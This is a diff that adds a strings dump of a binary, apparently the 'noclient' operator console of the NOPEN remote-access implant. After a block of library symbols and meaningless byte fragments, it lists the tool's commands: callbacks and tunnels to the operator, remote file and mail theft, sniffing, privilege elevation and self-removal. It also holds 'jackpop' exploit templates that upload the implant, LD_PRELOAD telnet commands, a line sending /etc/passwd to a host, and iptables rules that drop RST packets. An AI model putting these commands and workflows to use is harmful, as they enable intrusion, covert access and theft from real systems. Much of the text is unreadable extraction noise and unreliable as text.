@@ -1,0 +1,2453 @@
+/lib/ld-linux.so.2
+libresolv.so.2
+_IO_stdin_used
+__gmon_start__
+libm.so.6
+libc.so.6
+in6addr_any
+strcpy
+setrlimit64
+waitpid
+ioctl
+chown
+getgid
+stdout
+utime
+getdtablesize
+recv
+connect
+sigemptyset
+fdopen
+geteuid
+inet_pton
+__mbrlen
+memmove
+munmap
+__ctype_b
+getenv
+setfsuid
+getegid
+__strtol_internal
+usleep
+getpid
+qsort
+fgets
+__strtoll_internal
+memcpy
+execl
+pclose
+perror
+readlink
+dup2
+mbrtowc
+getuid
+iswlower
+system
+malloc
+endpwent
+siglongjmp
+optarg
+vsnprintf
+recvfrom
+strtoul
+gethostbyaddr
+socket
+select
+readdir
+__strtoul_internal
+fflush
+__ctype_toupper
+putenv
+sigaddset
+mmap
+strncasecmp
+send
+freeaddrinfo
+abort
+alarm
+popen
+__sigsetjmp
+__lxstat
+accept
+rename
+strrchr
+calloc
+gai_strerror
+__ctype_get_mb_cur_max
+kill
+setpwent
+ctime
+strcat
+bind
+inet_addr
+chdir
+setsockopt
+fseek
+optind
+stdin
+wait
+umask
+mktime
+ferror
+strstr
+strcoll
+strncmp
+strncpy
+unlink
+setenv
+strcasecmp
+sendto
+wcwidth
+realloc
+towupper
+__strdup
+bcopy
+strtok
+listen
+fork
+sscanf
+strncat
+execlp
+sigaction
+__res_init
+fread
+__xstat64
+regcomp
+gettimeofday
+getopt
+localtime
+memset
+srand
+ntohs
+inet_ntoa
+getppid
+tcgetattr
+regexec
+opendir
+poll
+strcmp
+getpwuid
+getcwd
+__res_state
+gethostbyname
+strsignal
+getpwnam
+sprintf
+msync
+fclose
+setlocale
+getpeername
+stderr
+srandom
+fsync
+fputc
+iswupper
+getsockopt
+getaddrinfo
+socketpair
+strftime
+fwrite
+access
+setfsgid
+__xstat
+htons
+strptime
+rewind
+__errno_location
+towlower
+__fxstat
+sigdelset
+inet_ntop
+iswalnum
+gethostbyname2
+fopen
+atoi
+_IO_putc
+fileno
+_exit
+getpwent
+gmtime
+__libc_start_main
+strlen
+regfree
+strchr
+fputs
+execvp
+closedir
+fcntl
+tcsetattr
+mkdir
+__ctype_tolower
+wcrtomb
+vfprintf
+strpbrk
+tcflow
+sigprocmask
+getsockname
+fopen64
+__environ
+GLIBC_2.0
+GLIBC_2.2
+GLIBC_2.1
+PTRhl8
+[^_]
+[^_]
+L[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+NO! 
+|$,1
+\$@1
+u{;E
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+`[^]
+,[^_]
+0[^]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+/cur
+rent
+/bin
+/ourf
+[^_]
+[^_]
+[^_]
+/usr
+/loc
+al/b
+in/s
+cannf
+ >> 
+/cur
+rent
+/dow
+n/cm
+dout
+/scaf
+@ ns
+< tj
+01-0
+1-19f
+-get
+-get
+[^_]
+[^_]
+<+t6
+8 uf
+> u/
+8 u#
+[^_]
+t?<.t6
+l[^_]
+[^_]
+[^_]
+<-t4<=t0
+,[^_]
+[^_]
+[^_]
+[^_]
+f;9u
+f;9u
+()[]
+0.0.
+[^_]
+[^_]
+[^_]
+[^_]
+/tmp
+/.sc
+/tmp
+/.dr
+/tmp
+/.ps
+i_pt
+/tmp
+/.ds
+kman
+[^_]
+send
+mail
+podd
+nscd
+nmbd
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+WVS1
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+\[^_]
+f;Q6u
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+<[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+L[^_]
+WVS1
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+,[^_]
+,[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+awk 
+' { 
+prin
+t $4
+ } '
+ /tm
+p/gx
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+WVS1
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+l[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+WVS1
+[^_]
+tA<	t
+[^_]
+tq<"
+<'tt<"
+[^_]
+[^_]
+[^_]
+\[^_]
+\[^_]
+[^_]
+#Eg1
+[^_]
+[^_]
+[^_]
+[^_]
+=/=j
+$[^_]
+;7wu
+([^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+<[^_]
+[^_]
+<[^_]
+<[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+,[^_]
+[^_]
+[^_]
+M 9U
+[^_]
+\[^_]
+\[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+L[^_]
+L[^_]
+,[^_]
+,[^_]
+,[^_]
+,[^_]
+[^_]
+,[^_]
+Beeb
+,[^_]
+,[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+<[^_]
+\[^_]
+\[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+tMvS
+[^_]
+C@JFGN
+OSye
+[^_]
+[^_]
+[^_]
+,[^_]
+,[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+wTf=
+t2wHf=
+[^_]
+2v{{
+tQ<.
+u t(
+L[^_]
+L[^_]
+L[^_]
+[^_]
+[^_]
+[^_]
+SP;SL
+KH9KD
+,[^_]
+C<iS$
+S8iE
+S8iE
+[^_]
+C,uK
+[^_]
+[^_]
+{ 9}
+{ 9}
+{ 9}
+[^_]
+[^_]
+8T0	
+8T0	
+8T0	
+[^_]
+<[^_]
+<[^_]
+VUUU
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+	u-9
+[^_]
+[^_]
+	tH9
+_u 9
+	u89
+[^_]
+[^_]
+<_u&
+< t	<	
+[^_]
+<	t	
+<[^_]
+ [^]
+ [^]
+ [^]
+,[^_]
+<[^_]
+,[^_]
+,[^_]
+,[^_]
+[^_]
+ [^]
+|[^_]
+L[^_]
+<[^_]
+tG<.
+L[^_]
+p[^]
+8~ub
+,[^_]
+<'t 
+,[^_]
+<[^_]
+[^_]
+,[^_]
+,[^_]
+<[^_]
+[^_]
+ [^]
+<[^_]
+L[^_]
+[^_]
+[^_]
+t2< 
+[^_]
+[^_]
+<[^_]
+L[^_]
+[^_]
+[^_]
+t3< 
+tD< t
+*< t
+t"< t
+<[^_]
+t-< t
+[^_]
+\C-?
+L[^_]
+,[^_]
+[^_]
+reve
+rse-
+i-se
+archf
+,[^_]
+C,9C0u
+R=}B	
+C`;C\t
+S\+S
+K0;K,
+,[^_]
+,[^_]
+<[^_]
+\[^_]
+[^_]
+,[^_]
+O5Dj
++5Dj
+<[^_]
+[^_]
+[^_]
+u	9u
+s39]
+9=<j
+|	;E
+;=<j
+[^_]
++=0k
+VUUU
+~H;]
+l[^_]
+[^_]
+<0~u+
+<~t$< t
+,[^_]
+,[^_]
+,[^_]
+,[^_]
+,[^_]
+[^_]
+,[^_]
+[^_]
+ [^]
+,[^_]
+[^_]
+<[^_]
+,[^_]
+[^_]
+,[^_]
+<[^_]
+[^_]
+,[^_]
+L[^_]
+43;u
+<;9}
+L[^_]
+,[^_]
+,[^_]
+[^_]
+<[^_]
+,[^_]
+[^_]
+P[_]
+tR9X
+[^_]
+<>t0<<u4
+<$t+
+<\u<
+,[^_]
+L[^_]
+>\u-
+L[^_]
+<-u	
+<[^_]
+<[^_]
+t0<'u
+<%uQ
+<*uA
+<$u(
+<-tn<^u
+<&uF
+@<\u
+)< t	<	t
+[^_]
+.his
+tory
+<[^_]
+[^_]
+<[^_]
+<[^_]
+>~t+
+</u(
+t(</t$
+,[^_]
+t|<~tx
+<[^_]
+WVS1
+t"C;]
+[^_]
+,0<	wX
+,0<	w=B
+[^_]
+[^_]
+[^_]
+gfff
+XZSW
+Y^SW
+[^_]
+[^_]
+WVS1
+t$<\u
+[^_]
+;/u	
+GVSP
+[^_]
+j)h 
+j)h 
+[^_]
+!<:u
+j=QR
+<:t'
+,0<	wZ
+,0<	w=B
+[^_]
+,0<	v
+[^_]
+Pj2h
+gfff
+gfff
+gfff
+[^_]
+ ^_]
+%m-%d-%y %T GMT
+strftime
+[1;33m
+[0;31m
+ server will execute:
+  %s
+and then 
+BURN
+Hit ^C to abort.
+%H:%M:%S
+  %s        
+Done.
+Sorry only one pilot at a time
+Bad port %s
+Please connect to me on %d
+bind
+listen
+accept
+We will be flying shortly
+[0;34m
+-burnBURN
+BURN
+To adjourn, type "BURN", otherwise return> 
+noclient: server does not support burn
+[0;31m
+noclient: failed to close connection to server: %s
+Hasta
+[0;32m
+Error during parsing of address %s: %s
+[0;31m
+%s: Invalid port
+Initiating callback to 
+[0;34m
+%s:%hu
+[0;32m
+Starting listener on port 
+noclient: waiting for response from server...
+noclient: server failed to fork new process: %s
+noclient: server failed to detect new process status: %s
+noclient: server process at PID %ld exited early with status %hu (%s)
+noclient: server process at PID %ld was killed with signal %hu (%s)
+noclient: server successfully forked new process at PID %ld
+NHOME
+%s/etc/cksums
+Opening checksum file "%s"... 
+[0;34m
+[0;32m
+%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X
++ %s %s %s
++ %s
+- %s %s %s 
+[1;33m
+Connection
+[0;34m
+  Bytes In / Out     %u/%u
+ (%d%%C)
+ / %u/%u
+  Local Host:Port    localhost:%hu (127.0.0.1:%hu)
+  CRemote Host:Port  %s:%hu (%s:%hu)
+  Remote Host:Port   %s:%hu (%s:%hu)
+Local
+3.3.2.3
+  NOPEN client       %s
+%a %b %e %T UTC %Y
+  Date/Time          %s
+  History            %s
+  Command Out        %s
+  CWD                %s
+  NHOME              
+NHOME
+NOT SET
+[1;33m
+  PID (PPID)         %ld (%ld)
+%5d  %s
+Remote
+  NOPEN server       
+%s (version mismatch, %s != %s)
+  WDIR               
+WDIR
+  OS                 %s %s %s %s
+Hasta
+Tacocat
+[0;32m
+noclient: failed to close connection to server: %s
+[0;31m
+noclient: pipe: connection closed
+noclient: Received Ctrl+C (^C) on input
+bufsend
+noclient: flushing the session: 
+poll
+recv
+done
+Remote General Commands:
+Remote Server Commands:
+Remote Network Commands:
+Remote Redirection Commands:
+Remote File Commands:
+Remote Directory Commands:
+Local Client Commands:
+Local Environment Commands:
+Usage:
+       %s [-c command] [-s srcport] hostname[:port]
+       %s [-c command] -l port
+%s -v
+Could not find/execute %s: %s
+%d.%d.%d.%d
+getsockname
+FAILED TO NEGOTIATE WITH PEER, EXITING
+NOPEN server version... 
+Incompatible versions. Use a different noclient or noserver. Exiting.
+NOPEN_SERVERINFO=%s %s %s %s
+NOPEN_RHOSTNAME=%s
+down/history
+%s/%s
+down/cmdout
+%Y-%m-%d-%T
+%s/%s-%s
+History loaded from "%s"
+Creating history file "%s"... 
+Creating command output file "%s"... 
+NOPEN_MYLOG=%s
+NO! %s:%s>
+NO! localhost:%hu -> %s:%hu %s
+NO! localhost:%hu -> %s:%hu ?
+[keepalive: server is alive, remote time: %s
+Unable to allocate memory for command
+%s%s
+What?  Are you nuts? (%d more)
+It looks like we are in a bad state, Elvis has left the building
+Unable to allocate memory for command, try again
+Command TOO LONG! Try one smaller than %d bozo.
+/proc/net/tcp
+/proc/net/tcp6
+NOPEN!                             v%s
+NOPEN_CLIENTVER=%s
+/dev/urandom
+NOPEN_MYPID=%ld
+scanner
+ourtn
+scripme
+%a %b %d %T GMT %Y
+I couldn't open that file
+Turning off compression
+xf:i:c:q:l:s:o
+NHOME=%s/..
+NHOME: environment variable not set, assuming "%s"
+NHOME=%s
+TERM
+TERM: environment variable not set, assuming "dumb"
+TERM=dumb
+TERM=%s
+%s: Not a directory
+Entering INCISION mode
+Failed to enter INCISION mode; invalid descriptor: %s
+Failed to enter INCISION mode; invalid connection: %s
+Using existing connection from 
+%s:%d
+Unable to resolve remote IP address!
+Entering client mode
+localhost
+127.1
+127.0.0.1
+Error during parsing of address %s: %s
+Attempting connection from 0.0.0.0:%hu to %s:%hu... 
+Attempting connection to %s:%hu... 
+Error during connection to %s:%hu, exiting
+Error during lookup of %s: %s
+Ran out of addresses to attempt, exiting
+Entering server mode
+Error during setup of listener *:%hu, exiting
+Accepted connection from 
+NOPEN_SERVERINFO
+Could not determine remote endianness, please report
+i586
+i686
+i486
+i386
+HP-UX
+sparc
+i86pc
+i?86
+alpha
+x86_64
+amd64
+Command out file: %s
+[0;34m
+Maybe "%s" will show you the way.
+[0;31m
+> L:
+> T:
+%s: Invalid command
+%s: Invalid filename '%s'
+[Saving 
+[0;34m
+[Appending 
+ output to: %s]
+  Type "YES" to overwrite [%s]> 
+unlink error
+Tried a second time and failed to open
+%s: invalid event
+%s: event not found
+-nohist
+%m-%d-%y %T GMT
+[%s][localhost:%hu -> %s:%hu]
+[%s]
+-skip
+  Type "GO" to run "%s"
+[1;33m
+Command skipped.
+-pause
+Pausing %ds: 
+Hit <Return> to continue.
+-ask
+[1;34m
+GSANSWER
+-beep
+-stop
+STOP
+failed to open global_output_file
+-lsh
+%s: No such builtin
+Usage: 
+[0;34m
+-oget
+[-a] [-q] [-s skipoff] [-b begoff] [-e endoff] remfile
+-get
+[-l] [-q] [-v] [-s minimumsize] [-m MM-DD-YYYY] remfile ...
+-cat
+remfile
+-tail
+[+/-n] remfile, + to skip n lines of remfile beginning
+-head
+[-n] remfile
+-chili
+[-l] [-s lines] [-m max] MM-DD-YYYY remdir remfile [remfile ...]
+-sget
+hostname port file [file ...]
+-srecv
+port
+-fget
+[MM-DD-YYYY] loclist
+-put
+locfile remfile [mode]
+-hist
+-exit
+-quit
+-burn
+-burnBURN
+-status
+-stat
+-help
+remfile|remdir ...
+category|filename [options-if-any]
+-setenv
+VAR=[val]
+-lsetenv
+[-1ihuRt] [-x[m|a|c] MM-DD-YYYY] [remfile|remdir ...]
+-find
+[-d] [-M | -m -mkfindsargs] [-x[m|a|c] MM-DD-YYYY] remdir [remdir...]
+-remark
+[comment]
+-rem
+-readrc
+[locfile]
+-lsh
+[[-q] command]
+-pid
+[remdir]
+-cdp
+-getenv
+-lgetenv
+-lcd
+locdir
+-lpwd
+-cksum
+remfile ...
+-stun
+toip toport [localport [srcport [srcip]]]
+-rtun
+[listenip:]port [toip [toport]] [fromip]
+-nstun
+toip [toport [localport [srcport [srcip]]]]
+       -nstun toip:port [srcip]
+-nrtun
+[listenip:]port [fromip]
+-sutun
+-strings
+-touch
+[-t mtime:atime | refremfile] remfile
+-shell
+[alt_shell]
+-ifconfig
+-scan
+[scan_name|port] [targetip]
+-upload
+file port [fromip]
+-tunnel
+[command_listen_port [udp|tcp [autoclose]]]
+-cmdout
+[locfilename]
+-call
+toip toport
+[-B] time[m] command
+-listen
+-jackpop
+target_ip target_port source_ip source_port
+-nslookup
+name1 ...
+-irtun
+target_ip call_back_port|RHP [listen_ip] [ourtn arguments]
+-reset
+-ping
+-r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] [-s src_port]
+       -ping host
+       -ping [-u|-t|-i] host
+-trace
+-r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] [-s src_port]
+       -trace host
+       -trace [-u|-t|-i] host
+-sniff
+localfile iface [exclusion filters ports or ips]
+ Ex. -sniff outfile le0 128.20.2.1 (sniffs for all traffic except from 128.20.2.1)
+-sentry
+target_address source_address (tcp|udp) dest_port src_port interface
+-mailgrep
+[-l] [-m maxbytes] [-r "regexp" [-v]] [-f regexpfilename [-v]] [-a "regexp for attachments to eliminate"] [-b MM-DD-YYYY] [-e MM-DD-YYYY] [-d remotedumpfile] remotedir file1 [file2 ...]
+ ex: -mailgrep -a ".doc" -r "^Fred" -b 2-28-2002 /var/spool/mail G*
+-grep
+[-d] [-v] [-n] [-i] [-h] [-C number_of_context_lines] pattern file1 [file2 ...] 
+-icmptime
+target_ip [source_ip] 
+-rawsend
+[-s] tcp_port
+-suc
+[get|<filename>] | [-s] <pid> [<pid>..] | blow | info | filter | free | unhook
+-time
+-elevate
+-vscan
+ (should add help)
+-jscan
+[-t timeout] scanType target [dstPort] [srcPort]
+-autopilot
+port [xml]
+-hstun
+toip [toport [localport [srcport [srcip]]]]
+       -hstun toip:port [srcip]
+-hrtun
+port [toip [toport]] [fromip]
+-hutun
+toip toport [localport [srcport]]
+-lpid
+-sha1sum
+-throttle
+-d | bps
+-istun
+target_ip call_in_port|RHP [srcip] [ourtn arguments]
+-rutun
+[listenip:]port [toip [toport]]
+-keepalive
+[-d] [-r] [[-v] interval]
+[options]
+  select: -p pid1,pid2,... -q ppid1,ppid2,... -g gpid1,gpid2,...
+          -n user1,user2,... -u uid1,uid2,...
+          -t "ddMmmyy hh:mm"|yyyymmddhhmm|epoch
+  sort:   -P  -Q   -G   -N   -U  -T     -V
+          pid ppid gpid user uid time   inverse
+  grep:   -r regex [-v] [-i]
+  show uid: -I
+  show last 24hrs: -d
+  tree view: -H
+rHNI
+noclient: tunneled process %ld terminated 
+[0;34m
+with status %hu
+with signal %hu
+[1;33m
+setsockopt
+socket
+bind
+connect
+listen
+poll
+DONE
+%m-%d-%y %T GMT
+  [%s]
+Success
+Internal error during tunnel traffic: %s
+[0;31m
+noclient: still receiving data from server
+noclient: remote connection closed
+UDP packet of size %d received locally
+noclient: local peer disconnected, closing connection (%s)
+UDP packet of size %d received from %s:%hu to %s:%hu
+noclient: remote peer disconnected, closing connection (%s)
+noclient: received DONE, closing remote connection
+noclient: local connection closed: %s
+noclient: local connection closed
+FreeBSD
+Darwin
+0.0.0.0
+ourtn is not executable, exiting
+noclient: unable to fork(2) a new process: %s
+ourtn -D %s -W 127.0.0.1:%hu -i %s -p %hu %s %s
+noclient: executing: 
+[0;32m
+bash
+/bin/bash
+noclient: ourtn exited early with status %hu
+noclient: ourtn was killed with signal %hu (%s)
+noclient: ourtn exited early
+accept
+noclient: failed to receive trigger packet from ourtn: %s
+noclient: waiting to receive %d byte trigger packet
+noclient: received only %d/%d bytes of packet
+noclient: error during packet receive: %s
+noclient: successfully received %d byte trigger packet
+noclient: 
+trigger packet identified as ICMP
+trigger packet identified as TCP
+trigger packet identified as UDP
+trigger packet not identified. IPPROTO number is %d
+Eleele
+Error during parsing of address %s: %s
+Using TCP port %hu for the callback tunnel
+Using TCP port %hu for the call forward tunnel
+Invalid port %s specified
+Preparing to trigger target %s to call back to %s:%hu
+Preparing to trigger target %s to listen on port %hu
+ourtn execution failed, exiting
+noclient: preparing to send trigger packet received from PID %ld
+noclient: server failed to send trigger packet: %s
+noclient: server sent trigger packet successfully
+Listening on 
+%s:%hu (%s:%hu)
+Connecting to 
+localhost:%hu (127.0.0.1:%hu)
+%s:%hu (%s:%hu) 
+from 
+%s:%hu
+noclient: local connection failed, waiting 2 seconds and trying again
+noclient: reached maximum connection attempt count, bailing
+noclient: local connection failed
+noclient: waiting for remote connection...
+Internal error: %s
+noclient: remote connection closed
+noclient: remote connection closed: %s
+noclient: unable to set up remote listener: %s
+noclient: failed to send delayed trigger
+noclient: connection desynchronized! Trying to recover...
+noclient: local peer disconnected, closing connection
+noclient: received connection from %s
+noclient: peer address is %s
+stty 2506:5:bf:a3b:3:1c:7f:15:4:0:1:0:11:13:1a:0:12:f:17:ff:0:0:2f:0:0:0:0:0:0:0:0:0:0:0:0:0
+Using TCP port %hu for the listener
+noclient: local connection closed
+noclient: failed to read from file: %s
+noclient: file upload complete, closing remote connection
+scanner is not executable, exiting
+echo "[%s
+scanner nopendump
+%d%d
+Unable to find a good scanner, maybe your PATH is an issue?
+Available scans
+ %-15s%s
+Scan not found or invalid scan specified
+-sutun
+-stun
+NOPEN_CLEAN_ME_UP
+Waiting for NOPEN tunnels to be ready...
+scanner %s 127.0.0.1 one
+scanner %s 127.0.0.1
+popen
+[0;30m
+Invalid toport %s specified
+Invalid localport %s specified
+Invalid srcport %s specified
+localhost:%hu (127.0.0.1:%hu)
+%s:%hu (%s:%hu)
+ from 
+%s:%hu
+127.0.0.1:%hu
+Executing: %s %s
+%s did not exist, using %s
+noclient: received DONE, closed local connection
+noclient: received local connection, contacting server
+noclient: unable to set up remote connection: %s
+%s:%hu (%s:%hu)
+Allowing connections from 
+anywhere
+Executing: %s -l %s
+noclient: unable to set up remote listener: %s
+noclient: local connection failed
+Sending UDP datagrams to 
+noclient: waiting for remote transmitter...
+noclient: unable to set up remote transmitter: %s
+noclient: remote transmitter ready
+noclient: waiting for remote receiver...
+noclient: unable to set up remote receiver: %s
+noclient: remote receiver ready
+/current/bin/noclient
+Invalid date %s
+[0;31m
+ab:e:qs:
+End offset less than or equal to beginning offset
+[0;31m
+%s: invalid option -- %c
+%s: Invalid number
+m:s:l
+Argv[%d]: %s
+-mailgrep
+%s: Bad regexp filename
+%s: Bad regexp file
+Bad regular expression pattern!
+%s: Bad reg exp
+name=.*%s
+-grep
+Invalid call to get()
+NHOME
+down
+%s/%s
+bad packet received
+%s: Zero length
+[1;33m
+%s/%s/%s
+%s/%s/%s%s/
+%s.%03d
+%s: File exists, renaming to %s
+  %s -- %s
+[0;34m
+mailgrep receive
+DONE.  Received %d bytes
+bufrecv
+close
+  %d bytes remaining.  To snag the rest, use the following command:
+    -oget -a -b %d %s %s
+lfname
+From 
+  No "^Date " lines found.
+  Last "^Date " line found:
+    %s
+/current/down/manifest
+mode %8o uid %8d gid %8d size %15llu m %010d a %010d c %010d %s
+xterm -e view "%s" &
+a.m.
+p.m.
+january
+february
+march
+april
+june
+july
+august
+september
+sept
+october
+november
+december
+sunday
+monday
+tuesday
+tues
+wednesday
+wednes
+thursday
+thur
+thurs
+friday
+saturday
+ahst
+idlw
+mewt
+mest
+mesz
+wast
+wadt
+east
+eadt
+nzst
+nzdt
+idle
+year
+month
+fortnight
+week
+hour
+minute
+second
+tomorrow
+yesterday
+today
+last
+this
+next
+first
+third
+fourth
+fifth
+sixth
+seventh
+eighth
+ninth
+tenth
+eleventh
+twelfth
+nopen_auto.%d
+"%s" 
+NHOME
+%s/etc/gs.%s
+/port
+[1;33m
+NOPEN_AUTOPORT
+/current/etc/autoport.%s.nevermind
+No active connections to NOPEN autoport, cancelling -gs /port
+[0;31m
+noclient: unable to verify autoport connection: %s
+noclient: 
+[0;34m
+reading commands from peer %s:%hu via fd %d
+noclient: unable to prepare autoport connection: %s
+#NOGS
+%s: Invalid script header "%s"
+GSOPTIONS
+> L:
+> T:
+-restart
+NO! %s:%s>
+NOPEN autoport connection closed, switching to fd %d
+***** %s ***** (length %d)
+%02x 
+init
+%u.%u.%u.%u.%u
+   %13s  %-22s  >  %-22s 
+[0;34m
+   ( udp %d)
+S %u:%u
+%u:%u (%u) 
+ ack %d
+%u.%u.%u.%u
+ %17s > %17s 
+(TTL %3d) 
+%s.%s
+error from server
+[0;31m
+iptables -%c OUTPUT -p tcp -d %s --tcp-flags RST RST -j DROP;
+Rule 1: %s
+[0;34m
+iptables -%c INPUT -p tcp -d %s --tcp-flags RST RST -j DROP;
+Rule 2: %s
+iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;
+Rule 3: %s
+iptables -%c INPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;
+Rule 4: %s
+SunOS
+5.10
+5.11
+-jackpop is only supported for Solaris 2.6+, you are using %s %s
+[0;31m
+Could not find host %s
+Bad toport
+Bad srcport
+Here are your current options:
+	[1] Upload Nopen and start listener
+	[2] Upload Nopen and do callback
+	[3] Run a command
+	[4] Upload Nopen, using incision and ftshell, and do a callback
+	[5] Let me out of here
+Your Choice[1]  
+We currently don't support that choice
+Which port would you like nopen to call back on?  
+[%d]  
+Port is outside range...
+Which port will we be connecting back to incision with?  
+UTC offset?  
+bad offset
+Attempting to find the host type
+/current/etc/autotnplatform %s
+popen
+platform:
+I was unable to find the platform, sorry
+Which version of incision? 
+	[1] Sparc Solaris, 
+	[2] X86 Solaris, 
+	[3] Linux, 
+	[4] HPUX
+	[5] Exit
+Which version of incision? [%d]  
+Please give a value between 1 and 4
+Which port will we be uploading nopen on?  
+Which port would you like nopen to listen on?  
+Nopen to upload[] 
+I'm afraid I couldn't find that file
+Which directory would you like to create[%s] 
+This looks like a bad directory %s
+Do you want incision to bless the nopen server? [Yn] 
+What we have so far...:
+	Connecting to %s:%s from %s:%s
+	Nopen upload port [%d]
+	Nopen callback port [%d]
+	Nopen listen port [%d]
+	File to upload [%s]
+	Nopen's name [%s]
+	Directory to create [%s]
+	Bless Nopen [%s]
+Continue? [Yn] 
+Do you want incision to bless command? [Yn] 
+Command # 
+Exiting jackpop.
+listenport is %u
+Couldn't open raw socket; Are you root?
+Couldn't set IP_HDRINCL
+Couldn't open normal socket; Are you root?
+notraw
+1 Couldn't bind normal to the socket
+2 Couldn't bind normal to the socket
+Hello, this is your interactive Jack in the box....
+Sending Request to bind remote side
+Remote side bind failed 
+Error code is %d
+Error 2
+Could not do socket on RAW_SOCKET
+Error 3
+Could not do socket on SOCK_DGRAM
+Error 4
+Could not bind to the raw socket
+Error 5
+Could not bind to the normal socket
+Error 6
+Success
+select error
+Setting up eth0:6 interface up as %s
+ifconfig eth0:6 %s netmask 255.255.255.255
+ifconfig eth0:6
+Setting up iptables stuff
+Everything looks good to start the tunneling
+  RA=%s RP=%u 
+TA=%s TP=%u 
+suntelnet.sh %s 
+%s nc_port directory nopen_name %u nopen_listen_port
+sh -c 'EXPLOIT_SCRIPME="ourtn -T %s -n -I -ue -O %u -p %u 
+-C %s 127.0.0.1" scripme -F -t JACKPOPIN4 '&
+Running command *%s*
+waiting....
+/platform/SUNW,SystemEngine/kernel/drv/sy %s %u
+/platform/dvri86pc/kernel/drv/sy %s %u
+/dev/ttyia2 %s %u
+/usr/sbin/sysiddev %s %u
+Make sure you run the following in another window:
+-nrtun %u 
+	Please hit return when you are ready to continue
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u CMD="%s" NOPENJACK=yes 
+TA=%s TP=%u EXPLOIT_SCRIPME="
+SU= HIDEME= HIDECON= 
+LD_PRELOAD=../bin/connect.so telnet 
+ %s 
+ %u " scripme -F -t JACKPOPIN4 ' & 
+xterm -hold -e sh -c 'packrat %s %s %u '&
+sh -c 'EXPLOIT_SCRIPME="packrat %s %s %u" scripme -F -t PACKRAT '&
+Packing....
+telnet %s %u </etc/passwd >/dev/null
+xterm -hold -e sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+telnet %s %u '&
+xterm -hold -e sh -c 'RA=%s RP=%u 
+TA=%s TP=%u jacktelnet.sh -q %s 
+%s %u %s %s %u %u' & 
+sh -c 'UTC_OFFSET=%d RA=%s RP=%u NOPENJACK=yes 
+TA=%s TP=%u EXPLOIT_SCRIPME="jacktelnet.sh -q 
+%s %u %s %s %u %u" scripme -F -t JACKPOPIN1 ' & 
+%s %u %s %s %u %u" scripme -F -t JACKPOP1 ' & 
+C=%s:%u jacktelnet.sh -q 
+%s %u %s %s %u " scripme -F -t JACKPOPIN2 ' & 
+%s %u %s %s %u " scripme -F -t JACKPOP2 ' & 
+sh -c 'RA=%s RP=%u LD_PRELOAD=../bin/connect.so CMD="%s" 
+EXPLOIT_SCRIPME="telnet %s %u" scripme -F -t JACKPOPIN3 ' &
+EXPLOIT_SCRIPME="telnet %s %u" scripme -F -t JACKPOP3 ' &
+ %u " scripme -F -t JACKPOPIN3 ' & 
+ %u " scripme -F -t JACKPOP3 ' & 
+When you are done, please type DONE.
+init
+Select error, closing down the tunnel
+DONE
+-nstun %s %u
+ifconfig eth0:6 down
+I got a string that was not DONE
+Incomming: 
+127.0.0.1
+Error from remote side
+Outgoing: 
+It looks like we timed out, cool
+leaving while
+What would you like nopen called on target [%s] 
+Keepalive disabled
+[0;34m
+Current keepalive interval: %d seconds
+hdrv
+Keepalive already disabled
+[1;33m
+Failed to disable keepalive: %s
+[0;31m
+Failed to enable keepalive: %s
+Keepalive enabled (probes sent every %d seconds)
+[%s]
+[0;34m
+  PID (PPID)         %d (%d)
+[0;34m
+%s-find
+AomacgfJM:x:
+%s: invalid option -- %c
+[0;31m
+mM1cdhituRx:n
+  inode mode       link owner    group        size   mtime               atime               ctime               filename
+bufrecv
+bufsend
+%b %e %H:%M %Y
+-touch -t %u:%u    
+%7lu 
+ %4d %-8s %-8s 
+%7.1fG 
+%7.1fM 
+%7.1fk 
+%8llu 
+| %s | %s | %s |
+ -- %s
+mkfinds %s
+Starting mkfinds %s
+I'm afraid we could not start mkfinds %s
+5Syntax error
+[0;31m
+/bin/sh
+%s: file exists but is not a directory
+[0;31m
+%s: file exists but it not a directory
+error from server
+[0;31m
+%d.%d.%d.%d%c
+*******NOPEN -tunnel commands*******
+[h]elp     - show this help
+[t]imeout time
+alula
+  [r]emote listenport [target [port [rem_target]]]
+  [l]ocal  listenport target [port [source_port]]
+  [L]ocal  listenport target [port [source_port]]; with one byte extra for socket state
+  [u]dp    listenport target [port [source_port]]
